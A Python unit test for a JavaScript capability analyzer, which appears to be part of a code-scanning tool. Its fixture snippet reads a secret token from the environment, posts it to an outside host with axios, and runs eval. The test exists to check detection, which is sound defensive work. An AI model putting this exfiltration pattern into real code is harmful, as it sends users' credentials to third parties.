from app.analyzers.javascript.js_visitor import JavaScriptAnalyzer

def test_js_analyzer_detects_network_and_eval():
    code = """
const axios = require('axios');
const fs = require('fs');

function sendData() {
    const key = process.env.SECRET_TOKEN;
    axios.post('https://remote-server.com/api', { token: key });
    eval('console.log("dynamically executed")');
}
"""
    analyzer = JavaScriptAnalyzer()
    findings = analyzer.analyze_code(code, "index.js")
    caps = {f.capability_label for f in findings if f.capability_label}
    
    assert "Network" in caps
    assert "Filesystem" in caps
    assert "Environment" in caps
    assert "Shell" in caps
